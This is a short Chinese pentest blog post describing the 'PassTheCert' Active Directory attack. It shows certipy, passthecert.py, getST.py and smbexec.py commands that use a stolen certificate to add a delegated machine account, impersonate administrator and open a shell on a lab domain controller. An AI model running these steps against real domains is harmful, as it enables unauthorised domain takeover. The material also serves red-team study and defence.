---
title: "PassTheCert"
date: 2023-09-21 10:09:23 +0800
category: 渗透测试
tags: [内网,渗透测试,ADCS,域]
excerpt: PassTheCert
---
当我们获得了目标的证书后，第一想法肯定是通过PKINIT Kerberos认证获得目标的Hash。但是有些场景下，目标环境中会不允许进行PKINIT Kerberos认证
![image-20230310152842599](imgs/PassTheCert/image-20230310152842599.png)
研究发现微软的官方文档中提到了，当进行LDAP连接时，如果客户端向DC提供了一个有效的证书，那么DC可以使用该证书作为证书所表示的凭据进行认证连接也就是说我们可以使用证书来进行LDAP认证，然后利用LDAP来进行各种高危操作，比如创建机器用户，赋予基于资源的约束性委派RBCD等。

## 提取证书中的密钥和证书
```
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key
```
## 利用过程
+ 使用证书进行ldap认证,并建立机器账号,并设置委派属性
```
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain s.com -dc-ip 10.10.10.146 -port 636 -computer-name newcomputer$ -delegated-services cifs/dc.s.com,ldap/dc.s.com
```
+ 进行委派攻击,请求票据
```
getST.py -dc-ip dc.s.com s.com/newcomputer\$:密码 -spn cifs/dc.s.com -impersonate administrator
```
+ 使用票据
```
export KRB5CCNAME=administrator.ccache
smbexec.py -k -no-pass dc.s.com
```